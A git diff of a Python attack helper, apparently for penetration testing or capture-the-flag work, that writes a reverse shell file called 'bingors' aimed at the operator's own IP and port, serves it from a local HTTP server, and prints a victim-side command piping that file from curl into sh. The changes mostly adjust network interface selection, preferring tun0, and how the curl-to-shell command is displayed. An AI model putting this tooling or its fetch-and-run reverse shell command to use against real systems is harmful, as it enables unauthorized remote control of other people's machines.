@@ -1,5 +1,4 @@
 #!/usr/bin/env python3
-
 import http.server
 from argparse import ArgumentParser
 from base64 import b64decode
@@ -12,16 +11,13 @@ from sys import stderr, exit
 from socketserver import TCPServer
 from termcolor import colored
 
-
 def print_info(*args):
     for info in args:
         print(f"[{colored('info', 'green')}] {info}")
 
-
 def perror(err):
     stderr.write(f"[{colored('error', 'red')}] {err}\n")
     exit(1)
-
 
 def gen_reverse_shell(ip, port):
     with open('bingors', 'w') as f:
@@ -68,19 +64,27 @@ parser.add_argument('--list-interfaces', action='store_true',
 args = parser.parse_args()
 net_ifaces = interfaces()
 
-if args.interface and args.interface not in net_ifaces:
-    perror(f"the interface '{args.interface}' is not available"
-           f" See: {basename(__file__)} --list-interfaces")
+if args.interface:
+    if args.interface not in net_ifaces:
+        perror(f"The interface '{args.interface}' is not available"
+            f" See: {basename(__file__)} --list-interfaces")
 else:
-    args.interface = net_ifaces[0]
+    if "tun0" in net_ifaces:
+        args.interface = "tun0" 
+    elif "eth0" in net_ifaces:
+	    args.interface = "eth0"
+    elif "wlan0" in net_ifaces:
+	    args.interface = "wlan0"
 
 
 if args.list_interfaces:
     print_info(f'Available network interfaces:')
     print(f"\t{', '.join(net_ifaces)}")
+    exit()
 
 
 ip = ifaddresses(args.interface)[AF_INET][0]['addr']
+addr = f'http://{ip}:{args.http_port}'
 
 if args.remote_port:
     gen_reverse_shell(ip, args.remote_port)
@@ -88,21 +92,18 @@ if args.remote_port:
                f"- Filename: bingors\n"
                f"- Interface: {args.interface}\n"
                f"- IP: {ip}\n"
-               f"- Port: {args.remote_port}\n")
+               f"- Port: {args.remote_port}")
+    print_info(colored(f"Reverse shell command: 'curl {addr}/bingors|sh'", "yellow"))
 
 handler = http.server.SimpleHTTPRequestHandler
 
+
 try:
     with TCPServer(('', args.http_port), handler) as httpd:
-        addr = f'http://{ip}:{args.http_port}'
         print_info(f"HTTP server was started on {addr}")
-
-        if args.remote_port:
-            print_info(f"Reverse shell: curl {addr}/bingors | sh")
-
         httpd.serve_forever()
 except KeyboardInterrupt:
     httpd.server_close()
     if exists('bingors'):
-        remove('bingors') # Delete reverse shell file
-    print("\rProgram finished! (CTRL + C)")
+        remove('bingors') 
+    print(colored("\rProgram finished! (CTRL + C)", "red"))
